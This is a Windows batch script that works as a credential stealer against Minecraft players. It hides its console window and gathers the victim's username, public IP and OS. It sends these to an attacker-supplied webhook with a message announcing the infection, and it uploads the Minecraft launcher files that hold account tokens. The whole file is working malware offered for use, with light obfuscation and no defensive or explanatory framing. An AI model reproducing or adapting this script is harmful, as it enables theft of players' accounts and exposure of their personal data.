@echo off

::::::::::::::::::::::::
:: ENTER WEBH00K HERE ::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

set authkey-web=[WEBHOOK HERE WITHOUT BRACKETS]

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

cls
mode con cols=15 lines=1
title %random%
set x=e
s%x%t s=o
s%x%t minecraftpath=%appdata%\.minecraft\
s%x%t webh%s%%s%k=%r%
mode con cols=35 lines=1
title %random%
curl -4 icanhazip.com 1> tmpwanip 2> nullwanip 
mode con cols=18 lines=1            
title %random%
set /p ipv4= < tmpwanip
mode con cols=40 lines=1
title %random%
del /f tmpwanip 
mode con cols=15 lines=1
title %random%
del /f nullwanip 
mode con cols=59 lines=1
title %random%
set message=:warning: **%username% got infected!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ipv4%\n:window: **OS** : %os% 
mode con cols=17 lines=1
title %random%
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %authkey-web%
mode con cols=157 lines=1
title %random%
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"------------------------------------------------------------\"}" %authkey-web%
mode con cols=150 lines=1
title %random%
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \":green_square: **MINECRAFT**\"}"  %authkey-web%
mode con cols=22 lines=1
title %random%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_profiles.json" %authkey-web%
mode con cols=34 lines=1
title %random%
curl --silent --output /dev/null -F minecraftauth=@"%appdata%\.minecraft\launcher_accounts.json" %authkey-web%
mode con cols=64 lines=1
title %random%
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"------------------------------------------------------------\"}" %authkey-web%
mode con cols=128 lines=1
title %random%